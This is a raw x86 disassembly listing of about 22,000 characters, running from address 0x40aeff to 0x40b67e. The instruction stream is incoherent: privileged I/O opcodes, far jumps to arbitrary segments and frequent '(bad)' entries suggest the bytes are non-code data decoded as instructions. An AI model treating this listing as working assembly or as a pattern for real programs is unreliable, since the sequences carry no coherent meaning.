  40aeff:	cmp    ecx,DWORD PTR [ebx+0x127f20ca]
  40af05:	adc    BYTE PTR [ebx-0x4dc24185],ch
  40af0b:	outs   dx,DWORD PTR ds:[esi]
  40af0c:	ins    BYTE PTR es:[edi],dx
  40af0d:	popf   
  40af0e:	pop    esp
  40af0f:	iret   
  40af10:	in     eax,0x79
  40af12:	sub    DWORD PTR [eax-0x243ae7a8],edx
  40af18:	xchg   ecx,eax
  40af19:	jmp    0xdd0c414d
  40af1e:	or     al,0x29
  40af20:	xor    BYTE PTR [esi+0x6603aa6f],0x83
  40af27:	ss xchg esp,eax
  40af29:	sbb    BYTE PTR [esi-0x30],bl
  40af2c:	sbb    eax,0x2917f890
  40af31:	sbb    BYTE PTR [esi+0x6a],0x55
  40af35:	adc    DWORD PTR [esi+0x1906e1c7],ecx
  40af3b:	mov    eax,ds:0x63f72164
  40af40:	dec    ebx
  40af41:	mov    edi,DWORD PTR ds:0x9c8669ec
  40af47:	push   ds
  40af48:	dec    esp
  40af49:	arpl   bp,dx
  40af4b:	cmp    DWORD PTR [eax],0xd75b7992
  40af51:	stc    
  40af52:	mov    al,0x4f
  40af54:	(bad)  [ebx-0x46]
  40af57:	sub    DWORD PTR [esi+eax*4-0x3d48864b],ebp
  40af5e:	cmp    DWORD PTR ds:0xb99b12bf,esp
  40af64:	push   0xffffffe5
  40af66:	not    BYTE PTR [ebp-0x52]
  40af69:	in     al,dx
  40af6a:	dec    ebp
  40af6b:	and    BYTE PTR [ebp-0x717d6891],ch
  40af71:	je     0x40af0a
  40af73:	test   DWORD PTR [edi-0x5b],esp
  40af76:	mov    ecx,ds
  40af78:	retf   
  40af79:	sbb    eax,0x992aa209
  40af7e:	scas   al,BYTE PTR es:[edi]
  40af7f:	adc    ebp,0x3c
  40af82:	rsm    
  40af84:	mov    ecx,DWORD PTR [ecx+0x5edef5a4]
  40af8a:	leave  
  40af8b:	cwde   
  40af8c:	mov    ah,0x9c
  40af8e:	pop    DWORD PTR [edx-0x37fd7278]
  40af94:	into   
  40af95:	jno    0x40afe7
  40af97:	sbb    dl,BYTE PTR [ebp-0x43eddb5f]
  40af9d:	jecxz  0x40afa6
  40af9f:	cmp    esi,esp
  40afa1:	or     DWORD PTR [edi+0xf85f20],eax
  40afa7:	cs dec edi
  40afa9:	(bad)  
  40afaa:	and    eax,0x43af891c
  40afaf:	or     BYTE PTR [edx-0x3edfa07c],al
  40afb5:	cmp    dl,BYTE PTR [ebx]
  40afb7:	add    eax,0x3aab93
  40afbc:	retf   0xb705
  40afbf:	hlt    
  40afc0:	sub    bl,dh
  40afc2:	adc    esp,ecx
  40afc4:	loop   0x40b02e
  40afc6:	add    DWORD PTR [ecx],0x8c548a5a
  40afcc:	call   0xc829:0x5458bb8e
  40afd3:	loopne 0x40afd5
  40afd5:	add    al,0xc8
  40afd7:	cmp    dh,BYTE PTR [esi]
  40afd9:	mov    dh,0x93
  40afdb:	mov    ebx,0xb659d6bd
  40afe0:	adc    eax,0x7249ea21
  40afe5:	pop    ds
  40afe6:	ins    DWORD PTR es:[edi],dx
  40afe7:	xchg   ecx,eax
  40afe8:	inc    ecx
  40afe9:	shl    DWORD PTR [edx-0x6aea42f2],0x28
  40aff0:	popf   
  40aff1:	xor    eax,0xaedd97af
  40aff6:	inc    eax
  40aff7:	or     al,0x40
  40aff9:	mov    ah,0xbb
  40affb:	pushf  
  40affc:	dec    edi
  40affd:	nop
  40affe:	push   esi
  40afff:	push   esi
  40b000:	cld    
  40b001:	out    dx,eax
  40b002:	jae    0x40b023
  40b004:	icebp  
  40b005:	arpl   WORD PTR [esi+ebp*1-0x33b4e75d],si
  40b00c:	fadd   QWORD PTR ds:0xdd391225
  40b012:	inc    esp
  40b013:	pop    eax
  40b014:	int3   
  40b015:	fild   QWORD PTR [ecx-0x73]
  40b018:	inc    edi
  40b019:	les    esp,FWORD PTR [edi-0x49]
  40b01c:	dec    ecx
  40b01d:	mov    dh,BYTE PTR [ebx]
  40b01f:	and    DWORD PTR es:[esi-0x60],eax
  40b023:	lods   eax,DWORD PTR ds:[esi]
  40b024:	mov    eax,0x518d09d8
  40b029:	sahf   
  40b02a:	push   edi
  40b02b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b02c:	mov    al,0x4a
  40b02e:	cli    
  40b02f:	mov    ebp,0x46076aeb
  40b034:	inc    eax
  40b035:	mov    ds:0x191c786f,al
  40b03a:	xor    edi,DWORD PTR es:[edx+0x2bbc70d2]
  40b041:	mov    edx,DWORD PTR [ecx]
  40b043:	icebp  
  40b044:	xchg   ebp,eax
  40b045:	and    al,0x2
  40b047:	sbb    BYTE PTR [edi+edi*4],bh
  40b04a:	sub    al,0x15
  40b04c:	push   ebp
  40b04d:	adc    bh,BYTE PTR [eax-0x33424b70]
  40b053:	sar    dl,cl
  40b055:	gs nop
  40b057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b058:	dec    eax
  40b059:	xchg   esp,eax
  40b05a:	jo     0x40afe4
  40b05c:	jno    0x40b06d
  40b05e:	xchg   esp,eax
  40b05f:	xchg   esi,eax
  40b060:	cmp    eax,0xd644921
  40b065:	inc    edx
  40b066:	and    eax,DWORD PTR [esi-0x53b22cc2]
  40b06c:	outs   dx,BYTE PTR ds:[esi]
  40b06d:	pop    edx
  40b06e:	jmp    0x40b0e5
  40b070:	add    esi,DWORD PTR [ebp+0xf]
  40b073:	out    0xb2,al
  40b075:	pusha  
  40b076:	out    0x1e,eax
  40b078:	pushf  
  40b079:	mov    edi,0x6c3aa7b1
  40b07e:	xor    dh,BYTE PTR [ecx+eiz*2]
  40b081:	xchg   ecx,eax
  40b082:	adc    BYTE PTR [eax],dh
  40b084:	dec    ecx
  40b085:	or     DWORD PTR [ebx-0x14a41c1d],esi
  40b08b:	btc    edi,edi
  40b08e:	shr    BYTE PTR [edx+0x6bd14250],1
  40b094:	mov    ebx,0xc72e074d
  40b099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b09a:	xor    DWORD PTR [esi-0x12],0xfffffff4
  40b09e:	adc    BYTE PTR [edi],al
  40b0a0:	mov    ebp,0x5b8f8f86
  40b0a5:	adc    BYTE PTR [ecx+0x4f2a3ba],ch
  40b0ab:	lds    edx,FWORD PTR [ecx-0x40186b9f]
  40b0b1:	daa    
  40b0b2:	in     eax,dx
  40b0b3:	sub    al,0x3a
  40b0b5:	loopne 0x40b0f3
  40b0b7:	es das 
  40b0b9:	outs   dx,DWORD PTR ds:[esi]
  40b0ba:	cld    
  40b0bb:	dec    edx
  40b0bc:	jmp    0x1468:0x12373b2c
  40b0c3:	in     al,dx
  40b0c4:	sbb    ch,ch
  40b0c6:	pushf  
  40b0c7:	sti    
  40b0c8:	rcr    BYTE PTR [edi],1
  40b0ca:	ret    
  40b0cb:	cmp    DWORD PTR [ecx-0x4f930e39],edx
  40b0d1:	je     0x40b107
  40b0d3:	ret    0x9fe4
  40b0d6:	lea    ebp,ds:[edi+0x753f6326]
  40b0dd:	je     0x40b0d4
  40b0df:	fisub  DWORD PTR [ebx+ecx*8]
  40b0e2:	push   edx
  40b0e3:	add    cl,ch
  40b0e5:	rcl    BYTE PTR [ebp+0x33bbeafb],cl
  40b0eb:	leave  
  40b0ec:	dec    ebp
  40b0ed:	xchg   edx,eax
  40b0ee:	jae    0x40b081
  40b0f0:	dec    ecx
  40b0f1:	mov    dl,0xce
  40b0f3:	cld    
  40b0f4:	outs   dx,DWORD PTR ds:[esi]
  40b0f5:	or     eax,0x9efec2c3
  40b0fa:	add    edx,edx
  40b0fc:	inc    esp
  40b0fd:	jp     0x40b130
  40b0ff:	iret   
  40b100:	in     eax,0x69
  40b102:	call   0x462c231a
  40b107:	bound  ebx,QWORD PTR [ecx+esi*4-0x49aeea85]
  40b10e:	into   
  40b10f:	mov    BYTE PTR [ebx+eax*8],0x4a
  40b113:	int3   
  40b114:	xchg   dh,cl
  40b116:	sbb    ebp,ebp
  40b118:	pop    es
  40b119:	dec    ecx
  40b11a:	cmp    ebx,DWORD PTR [ebx+0x33]
  40b11d:	mov    esi,0x3cbd1554
  40b122:	imul   DWORD PTR [ecx-0x29]
  40b125:	pop    ds
  40b126:	inc    ebp
  40b127:	aas    
  40b128:	das    
  40b129:	cli    
  40b12a:	aaa    
  40b12b:	mov    eax,ds:0xbe7ec38a
  40b130:	xchg   edx,edx
  40b132:	sub    ecx,esp
  40b134:	sub    cl,BYTE PTR [edi]
  40b136:	in     eax,dx
  40b137:	xchg   esi,eax
  40b138:	mov    ebx,0xc56274aa
  40b13d:	xor    cl,0x8b
  40b140:	fs stc 
  40b142:	inc    esp
  40b143:	fdivr  st,st(4)
  40b145:	sahf   
  40b146:	into   
  40b147:	inc    ebx
  40b148:	clc    
  40b149:	(bad)  
  40b14a:	(bad)  
  40b14c:	loop   0x40b118
  40b14e:	add    al,0x67
  40b150:	cmp    BYTE PTR [ecx-0xad86cf0],al
  40b156:	fist   WORD PTR [edi+0x4e5c003a]
  40b15c:	popf   
  40b15d:	mov    cl,0x94
  40b15f:	sub    bl,BYTE PTR [eax+0x13]
  40b162:	and    ch,BYTE PTR [ebp-0x47]
  40b165:	ja     0x40b1d2
  40b167:	lock out 0x26,al
  40b16a:	iret   
  40b16b:	mov    edi,0x8cbc05d2
  40b170:	adc    eax,0x187cfd2d
  40b175:	add    cl,BYTE PTR [esi]
  40b177:	xchg   BYTE PTR [ebp-0x2c],cl
  40b17a:	jbe    0x40b1e9
  40b17c:	test   eax,0xfbfffc9c
  40b181:	adc    DWORD PTR [ebp-0x524c7502],esp
  40b187:	sar    DWORD PTR [eax+0x22],1
  40b18a:	sbb    ah,dh
  40b18c:	or     DWORD PTR ds:0x7908d3a7,esi
  40b192:	mov    al,0x8f
  40b194:	aam    0x8d
  40b196:	inc    esi
  40b197:	dec    edx
  40b198:	das    
  40b199:	cs cdq 
  40b19b:	inc    edx
  40b19c:	dec    esp
  40b19d:	pop    edx
  40b19e:	(bad)  
  40b1a0:	aaa    
  40b1a1:	es loope 0x40b1a4
  40b1a4:	sbb    al,0xe9
  40b1a6:	inc    esp
  40b1a7:	(bad)  
  40b1a8:	xlat   BYTE PTR ds:[ebx]
  40b1a9:	pop    es
  40b1aa:	test   eax,0xe1e0cc84
  40b1af:	sbb    DWORD PTR ds:0xc58502b5,0x9dd13154
  40b1b9:	add    cl,BYTE PTR ds:0x4bfb985a
  40b1bf:	pop    ss
  40b1c0:	cmp    BYTE PTR [edi+0x5f],al
  40b1c3:	xor    eax,0xe71bdf50
  40b1c8:	dec    ebx
  40b1c9:	stos   BYTE PTR es:[edi],al
  40b1ca:	mov    cl,0x59
  40b1cc:	pop    esi
  40b1cd:	xor    al,0x7
  40b1cf:	xor    edx,DWORD PTR [esi-0x386b8581]
  40b1d5:	int3   
  40b1d6:	int    0x52
  40b1d8:	mov    edi,eax
  40b1da:	retf   
  40b1db:	jo     0x40b224
  40b1dd:	xor    al,0xd6
  40b1df:	out    dx,eax
  40b1e0:	inc    ebp
  40b1e1:	xchg   edx,eax
  40b1e2:	popa   
  40b1e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1e4:	xchg   edi,eax
  40b1e5:	arpl   bp,sp
  40b1e7:	daa    
  40b1e8:	(bad)  
  40b1e9:	jno    0x40b18d
  40b1eb:	repnz sub al,ah
  40b1ee:	and    DWORD PTR [eax+edx*4+0x4c],0xadc94c97
  40b1f6:	test   eax,0x90b60235
  40b1fb:	bound  ebp,QWORD PTR [ebx+0x24]
  40b1fe:	lea    ebp,[eax+0x798a5893]
  40b204:	pop    ds
  40b205:	dec    ebx
  40b206:	jno    0x40b1df
  40b208:	jmp    0x40b213
  40b20a:	xchg   ebx,eax
  40b20b:	push   ebp
  40b20c:	bound  ebp,QWORD PTR [ecx+0x29]
  40b20f:	and    eax,0xcd913ed
  40b214:	xor    BYTE PTR [eax-0x25],0xca
  40b218:	(bad)  
  40b219:	pusha  
  40b21a:	dec    ebp
  40b21b:	xchg   BYTE PTR [edx],ch
  40b21d:	loopne 0x40b1b7
  40b21f:	push   edx
  40b220:	inc    esp
  40b221:	ss pop es
  40b223:	add    DWORD PTR [ebx-0x13],0xffffffd8
  40b227:	test   eax,0x730e8feb
  40b22c:	xor    al,0x58
  40b22e:	xchg   ebx,eax
  40b22f:	les    edi,FWORD PTR [ecx+eiz*4-0x5e4fac24]
  40b236:	clc    
  40b237:	pop    esi
  40b238:	push   esi
  40b239:	nop
  40b23a:	jmp    0x40b257
  40b23c:	jmp    0xe8bea608
  40b241:	cs push 0x865ae661
  40b247:	add    BYTE PTR [ecx+ebp*2+0x6c],0xef
  40b24c:	pop    eax
  40b24d:	jle    0x40b299
  40b24f:	mov    ebx,0x13406f57
  40b254:	enter  0x3b5b,0x45
  40b258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b259:	mov    ah,0xa4
  40b25b:	mov    eax,ds:0x512fcdae
  40b260:	pushf  
  40b261:	jmp    0x40b263
  40b263:	push   edx
  40b264:	adc    BYTE PTR [esi-0x650f085f],0x2e
  40b26b:	adc    eax,0x87a7a213
  40b270:	push   ss
  40b271:	jle    0x40b20d
  40b273:	dec    ebp
  40b274:	cld    
  40b275:	inc    esi
  40b276:	out    dx,al
  40b277:	mov    bl,0x3d
  40b279:	imul   edx,DWORD PTR [ecx],0x80bc4b10
  40b27f:	push   0xb65476d4
  40b284:	mov    ecx,0xf49eff61
  40b289:	xor    eax,0x1218126b
  40b28e:	ss jl  0x40b2a6
  40b291:	enter  0xeef1,0x80
  40b295:	and    esp,DWORD PTR [ebx]
  40b297:	jp     0x40b24f
  40b299:	adc    DWORD PTR [ecx-0x682ab28c],ebx
  40b29f:	and    eax,edi
  40b2a1:	mov    bl,0x3a
  40b2a3:	push   esp
  40b2a4:	add    BYTE PTR [ebp+0x52],ch
  40b2a7:	les    edi,FWORD PTR [ebx-0x2ed0f01]
  40b2ad:	push   0xffffff95
  40b2af:	clc    
  40b2b0:	ins    DWORD PTR es:[edi],dx
  40b2b1:	pushf  
  40b2b2:	dec    ebp
  40b2b3:	push   esp
  40b2b4:	cmp    BYTE PTR [edi],bl
  40b2b6:	jnp    0x40b29d
  40b2b8:	xchg   BYTE PTR [ecx+0x1],ch
  40b2bb:	push   esi
  40b2bc:	es addr16 jnp 0x40b247
  40b2c0:	jno    0x40b334
  40b2c2:	inc    edx
  40b2c3:	and    DWORD PTR [edi],0xffffffaf
  40b2c6:	adc    eax,0x45b2ca45
  40b2cb:	cmp    ah,bh
  40b2cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2ce:	adc    eax,0xcde0fd45
  40b2d3:	fcmovne st,st(7)
  40b2d5:	pop    es
  40b2d6:	aam    0xb3
  40b2d8:	(bad)  
  40b2d9:	push   ebx
  40b2da:	mov    DWORD PTR [edi],eax
  40b2dc:	jae    0x40b302
  40b2de:	adc    bh,BYTE PTR [ebx+0x62]
  40b2e1:	push   esi
  40b2e2:	call   edx
  40b2e4:	jmp    0x40b2cf
  40b2e6:	sub    BYTE PTR [esi+eax*2-0x72],dl
  40b2ea:	xchg   ebx,eax
  40b2eb:	cld    
  40b2ec:	pop    edx
  40b2ed:	daa    
  40b2ee:	scas   al,BYTE PTR es:[edi]
  40b2ef:	mov    dh,0x62
  40b2f1:	sub    eax,0x32c311b8
  40b2f6:	cmp    eax,0x68d17c35
  40b2fb:	mov    bh,0x9e
  40b2fd:	mov    ah,0xec
  40b2ff:	mov    dh,0x14
  40b301:	mov    cs,WORD PTR [edx]
  40b303:	xlat   BYTE PTR ds:[ebx]
  40b304:	jmp    0x4b66:0x749de933
  40b30b:	inc    ebp
  40b30c:	xor    eax,0x8efb9037
  40b311:	add    eax,0xbd5bd91c
  40b316:	sbb    esp,esi
  40b318:	test   BYTE PTR [ecx-0x502a2b14],bl
  40b31e:	out    dx,eax
  40b31f:	shr    ebx,cl
  40b321:	pop    ds
  40b322:	sbb    eax,0xb5b81fd7
  40b327:	inc    esp
  40b328:	push   ebp
  40b329:	lock mov esp,DWORD PTR [edi]
  40b32c:	jmp    0x40b2d9
  40b32e:	jae    0x40b2b2
  40b330:	cmp    ah,BYTE PTR ds:0x15a94a9
  40b336:	fwait
  40b337:	adc    bl,bh
  40b339:	fcmovbe st,st(0)
  40b33b:	lods   eax,DWORD PTR ds:[esi]
  40b33c:	pop    es
  40b33d:	ins    DWORD PTR es:[edi],dx
  40b33e:	dec    edi
  40b33f:	sub    al,0x7
  40b341:	aad    0x93
  40b343:	out    dx,al
  40b344:	jg     0x40b368
  40b346:	fstp   DWORD PTR [ebx-0x23d2739e]
  40b34c:	(bad)  [ebx+0x59]
  40b34f:	outs   dx,BYTE PTR ds:[esi]
  40b350:	push   esp
  40b351:	mov    ch,0xa0
  40b353:	mov    ebp,0xe3accac2
  40b358:	aam    0xa6
  40b35a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b35b:	pop    es
  40b35c:	dec    ecx
  40b35d:	fucomp st(1)
  40b35f:	lea    ebp,[edx]
  40b361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b362:	je     0x40b2f4
  40b364:	pusha  
  40b365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b366:	cld    
  40b367:	xchg   BYTE PTR [edx-0x47],bl
  40b36a:	(bad)  
  40b36d:	mov    ecx,ss
  40b36f:	mov    edx,0xa4afa241
  40b374:	mov    bl,0x7
  40b376:	jp     0x40b303
  40b378:	jnp    0x40b3f9
  40b37a:	push   ecx
  40b37b:	dec    edx
  40b37c:	xchg   edi,eax
  40b37d:	pop    ds
  40b37e:	mov    esi,0x53937509
  40b383:	sub    eax,0xc5748a80
  40b388:	and    eax,0xd824f5ba
  40b38d:	enter  0xe851,0x5d
  40b391:	pop    ss
  40b392:	rcl    DWORD PTR [edx+0x4eafdb83],0xb3
  40b399:	jbe    0x40b3a6
  40b39b:	stos   BYTE PTR es:[edi],al
  40b39c:	push   eax
  40b39d:	inc    ebp
  40b39e:	and    DWORD PTR [esi],edi
  40b3a0:	test   eax,0x4d90380d
  40b3a5:	xchg   BYTE PTR [edx-0x3dc79831],dh
  40b3ab:	adc    eax,0x5a580ca2
  40b3b0:	lods   al,BYTE PTR ds:[esi]
  40b3b1:	mov    WORD PTR [esi-0x5a19de28],?
  40b3b7:	mov    edi,0xb155474e
  40b3bc:	mov    ch,0xbb
  40b3be:	cmc    
  40b3bf:	mov    ebp,DWORD PTR [ebx+0x6e]
  40b3c2:	in     al,dx
  40b3c3:	lods   eax,DWORD PTR ds:[esi]
  40b3c4:	pushf  
  40b3c5:	cdq    
  40b3c6:	dec    ax
  40b3c8:	adc    eax,0xb56eeae
  40b3cd:	repz push ecx
  40b3cf:	pop    ss
  40b3d0:	in     al,0x43
  40b3d2:	aam    0x3e
  40b3d4:	mov    bl,0x85
  40b3d6:	adc    dl,BYTE PTR [ebp-0x4a]
  40b3d9:	lods   al,BYTE PTR ds:[esi]
  40b3da:	xchg   ah,bh
  40b3dc:	pop    es
  40b3dd:	inc    edi
  40b3de:	inc    eax
  40b3df:	cmp    ch,ah
  40b3e1:	lds    edx,FWORD PTR [ecx+0x1f7bd3e7]
  40b3e7:	jnp    0x40b38c
  40b3e9:	sbb    al,0xa0
  40b3eb:	(bad)  
  40b3ec:	pop    ebp
  40b3ed:	call   0x33a1d11b
  40b3f2:	adc    eax,0x2cf20674
  40b3f7:	in     eax,0x9c
  40b3f9:	xchg   ebx,eax
  40b3fa:	ja     0x40b40e
  40b3fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3fd:	fcmovne st,st(4)
  40b3ff:	jb     0x40b471
  40b401:	jo     0x40b42a
  40b403:	mov    ebx,0xaf282ed7
  40b408:	add    dh,BYTE PTR [eax+0x2bff7fea]
  40b40e:	pop    ebp
  40b40f:	mov    DWORD PTR [edi+eax*8+0x24],eax
  40b413:	in     al,dx
  40b414:	sbb    eax,0xac3174cc
  40b419:	jmp    0x2af7eff5
  40b41e:	ret    0xab80
  40b421:	ficomp DWORD PTR [edx+0xe]
  40b424:	mov    ds,WORD PTR [edi]
  40b426:	out    0xb6,al
  40b428:	push   eax
  40b429:	(bad)  
  40b42b:	cmp    cl,al
  40b42d:	add    bl,BYTE PTR [ebx+0x49]
  40b430:	fst    QWORD PTR [esi+eax*2]
  40b433:	push   eax
  40b434:	and    eax,0x7977287a
  40b439:	rol    ecx,0xe5
  40b43c:	das    
  40b43d:	push   esp
  40b43e:	in     al,dx
  40b43f:	dec    ebx
  40b440:	mov    DWORD PTR [ecx],esi
  40b442:	nop
  40b443:	cmp    BYTE PTR [ebx],dh
  40b445:	mov    DWORD PTR [ecx],0xe6b2b1c9
  40b44b:	sub    eax,0xeefb5117
  40b450:	mov    eax,0x185c3e77
  40b455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b456:	js     0x40b421
  40b458:	xlat   BYTE PTR ds:[ebx]
  40b459:	jge    0x40b4b9
  40b45b:	sbb    edi,edx
  40b45d:	jne    0x40b4c7
  40b45f:	add    al,0xa6
  40b461:	mov    ch,0x3d
  40b463:	push   esi
  40b464:	inc    ecx
  40b465:	dec    edx
  40b466:	je     0x40b49b
  40b468:	pop    eax
  40b469:	xor    bl,dl
  40b46b:	in     al,0x97
  40b46d:	push   es
  40b46e:	inc    esi
  40b46f:	ss push ebp
  40b471:	shl    DWORD PTR [ebx-0x2a436dd0],cl
  40b477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b478:	shl    DWORD PTR [esi],0xb5
  40b47b:	adc    DWORD PTR [edx],esi
  40b47d:	push   esi
  40b47e:	sub    al,0xd1
  40b480:	pushf  
  40b481:	cmp    ecx,DWORD PTR [edx+eiz*1]
  40b484:	xchg   ecx,eax
  40b485:	sbb    al,0xe3
  40b487:	push   ss
  40b488:	xor    al,0x2
  40b48a:	mov    ebx,0x96d9b755
  40b48f:	test   eax,0xba6a39fc
  40b494:	(bad)  
  40b495:	retf   0x316
  40b498:	into   
  40b499:	aas    
  40b49a:	mov    eax,ds:0x15aaa0bf
  40b49f:	shr    BYTE PTR [eax],cl
  40b4a1:	cmp    BYTE PTR [ecx+0x5e],dh
  40b4a4:	push   edi
  40b4a5:	push   ds
  40b4a6:	xchg   ebx,eax
  40b4a7:	aam    0x5b
  40b4a9:	(bad)
  40b4ac:	dec    ecx
  40b4ad:	jnp    0x40b44b
  40b4af:	clc    
  40b4b0:	test   BYTE PTR [eax*1-0x5ee49199],ah
  40b4b7:	mov    dh,0x7e
  40b4b9:	or     BYTE PTR [eax+0x4585c4d2],al
  40b4bf:	test   DWORD PTR [esi-0x166e51e6],0xf8f769a1
  40b4c9:	frstor [ebx-0xe86e3dd]
  40b4cf:	mov    dl,0x44
  40b4d1:	pop    ecx
  40b4d2:	mov    eax,0xf8d6d51b
  40b4d7:	daa    
  40b4d8:	jl     0x40b497
  40b4da:	sahf   
  40b4db:	mov    gs,eax
  40b4dd:	push   eax
  40b4de:	add    eax,esi
  40b4e0:	inc    ebp
  40b4e1:	test   DWORD PTR [esi+eax*1+0x44],esi
  40b4e5:	sub    ebp,DWORD PTR [edx+0x798f4173]
  40b4eb:	add    BYTE PTR fs:[ebx+0x3c],0x2b
  40b4f0:	mov    WORD PTR [ebp+0x52],es
  40b4f3:	aad    0x73
  40b4f5:	sub    ah,cl
  40b4f7:	stos   BYTE PTR es:[edi],al
  40b4f8:	sbb    eax,0x37a7f013
  40b4fd:	mov    ebp,0x8ee93204
  40b502:	pop    eax
  40b503:	add    eax,ebx
  40b505:	loop   0x40b4b6
  40b507:	jmp    DWORD PTR [eax+0x43]
  40b50a:	mov    ds:0xb5c73392,al
  40b50f:	aam    0x43
  40b511:	(bad)  
  40b512:	sbb    DWORD PTR [ebp-0x2b4f9db4],ecx
  40b518:	shl    BYTE PTR [edx-0x5ab03638],1
  40b51e:	dec    esi
  40b51f:	xor    DWORD PTR [ebx],eax
  40b521:	mov    bl,0xc7
  40b523:	icebp  
  40b524:	fisttp WORD PTR [eax-0x3b]
  40b527:	std    
  40b528:	cmp    BYTE PTR [ecx+0xf],bl
  40b52b:	mov    bl,dl
  40b52d:	test   eax,0x9d7018f3
  40b532:	mov    bl,0xde
  40b534:	dec    edi
  40b535:	inc    eax
  40b536:	mov    eax,ds:0x16adee36
  40b53b:	push   ebp
  40b53c:	cwde   
  40b53d:	or     BYTE PTR [eax],0x0
  40b540:	jl     0x40b547
  40b542:	addr16 xchg bh,ch
  40b545:	popa   
  40b546:	and    BYTE PTR [edi+0x5c3a5297],ah
  40b54c:	jnp    0x40b55d
  40b54e:	out    0xee,eax
  40b550:	mov    bh,0xb3
  40b552:	xchg   esp,eax
  40b553:	inc    ebx
  40b554:	in     eax,0xa3
  40b556:	retf   0x4511
  40b559:	push   ss
  40b55a:	ret    0x7842
  40b55d:	mov    edx,DWORD PTR [edi-0x190def45]
  40b563:	dec    esi
  40b564:	xor    al,0x52
  40b566:	shl    BYTE PTR [ebx+0x67],cl
  40b569:	add    DWORD PTR [ebp+0xa],0x3e515e1d
  40b570:	(bad)  
  40b571:	out    dx,eax
  40b572:	mov    edx,0x81728daa
  40b577:	xor    DWORD PTR [ecx+edi*8+0x4a3b7be2],eax
  40b57e:	cmc    
  40b57f:	adc    al,0x51
  40b581:	outs   dx,BYTE PTR ds:[esi]
  40b582:	rol    DWORD PTR [edx+esi*8-0x1c1a8ca4],0xe1
  40b58a:	das    
  40b58b:	shl    cl,cl
  40b58d:	cld    
  40b58e:	adc    DWORD PTR [ebp+ebp*8+0x3e],edi
  40b592:	enter  0xa495,0xdc
  40b596:	xchg   ebx,eax
  40b597:	xor    al,0xa8
  40b599:	sbb    DWORD PTR [esi],esi
  40b59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b59c:	dec    ecx
  40b59d:	mov    cl,0x7d
  40b59f:	inc    ebx
  40b5a0:	adc    eax,0xae73977
  40b5a5:	test   BYTE PTR [di+0x458e],ch
  40b5aa:	stos   BYTE PTR es:[edi],al
  40b5ab:	mov    DWORD PTR [esi],ebx
  40b5ad:	add    bh,dh
  40b5af:	sbb    al,0x20
  40b5b1:	(bad)  
  40b5b3:	or     ah,ah
  40b5b5:	test   dl,0xb9
  40b5b8:	adc    BYTE PTR [ebx+0x5f],dl
  40b5bb:	outs   dx,BYTE PTR ds:[esi]
  40b5bc:	loop   0x40b5e1
  40b5be:	fstp   DWORD PTR [ebx+0x79]
  40b5c1:	sti    
  40b5c2:	loope  0x40b5a3
  40b5c4:	nop    DWORD PTR [ecx]
  40b5c7:	inc    esi
  40b5c8:	test   al,0x58
  40b5ca:	popf   
  40b5cb:	xchg   esi,eax
  40b5cc:	xchg   ebp,eax
  40b5cd:	or     ch,BYTE PTR [esi+0x9]
  40b5d0:	retf   0x3779
  40b5d3:	dec    ecx
  40b5d4:	rol    BYTE PTR [edi],cl
  40b5d6:	lods   al,BYTE PTR ds:[esi]
  40b5d7:	or     eax,0xd2400ed5
  40b5dc:	stos   BYTE PTR es:[edi],al
  40b5dd:	mov    dl,0xc6
  40b5df:	sub    DWORD PTR [esi+esi*8+0x49],edx
  40b5e3:	repnz and esp,DWORD PTR [eax+0x32]
  40b5e7:	mov    bl,0x30
  40b5e9:	(bad)  
  40b5eb:	in     eax,dx
  40b5ec:	mov    ecx,0xd1bb814a
  40b5f1:	inc    esi
  40b5f2:	xor    ah,BYTE PTR [ecx]
  40b5f4:	cmp    edx,ecx
  40b5f6:	sbb    al,0xd4
  40b5f8:	retf   
  40b5f9:	repnz sub BYTE PTR [ecx-0x370de729],cl
  40b600:	hlt    
  40b601:	cmc    
  40b602:	dec    edi
  40b603:	cdq    
  40b604:	pusha  
  40b605:	push   ecx
  40b607:	mov    DWORD PTR [eax+ebp*4+0x6d],ecx
  40b60b:	pop    ss
  40b60c:	ins    DWORD PTR es:[edi],dx
  40b60d:	inc    DWORD PTR [bp+si-0x3987]
  40b612:	mov    BYTE PTR ds:0x3719061b,ah
  40b618:	mov    bl,0x9
  40b61a:	shl    DWORD PTR ds:0x1bf576c7,1
  40b620:	in     eax,dx
  40b621:	dec    ecx
  40b622:	shr    DWORD PTR [ecx-0xb],cl
  40b625:	and    esi,DWORD PTR [eax-0x24]
  40b628:	loope  0x40b64d
  40b62a:	jmp    0x40b68d
  40b62c:	xchg   esi,eax
  40b62d:	sahf   
  40b62e:	ins    BYTE PTR es:[edi],dx
  40b62f:	call   0x4b7c2637
  40b634:	push   esi
  40b635:	jb     0x40b60e
  40b637:	mov    ebp,0x1d06027f
  40b63c:	push   0x5a887230
  40b641:	pop    ds
  40b642:	push   0x3313be8c
  40b647:	outs   dx,DWORD PTR ds:[esi]
  40b648:	retf   0xda58
  40b64b:	sets   ch
  40b64e:	mov    esp,0x63a86e5c
  40b653:	sti    
  40b654:	mov    edi,0xda20068b
  40b659:	dec    ebp
  40b65a:	retf   0xafed
  40b65d:	adc    dh,BYTE PTR [ecx-0x58]
  40b660:	retf   
  40b661:	xor    eax,0xc6febc
  40b666:	and    ch,BYTE PTR [edx]
  40b668:	aas    
  40b669:	and    ebp,DWORD PTR [edi]
  40b66b:	retf   
  40b66c:	pop    ds
  40b66d:	cmp    al,0x65
  40b66f:	adc    DWORD PTR [ecx],esi
  40b671:	adc    BYTE PTR [esp+ebx*2],0xa6
  40b675:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b677:	jns    0x40b684
  40b679:	and    al,0xd1
  40b67b:	in     eax,dx
  40b67c:	dec    edi
  40b67d:	xlat   BYTE PTR ds:[ebx]
  40b67e:	xor    DWORD PTR [ebp+0x50],ebp
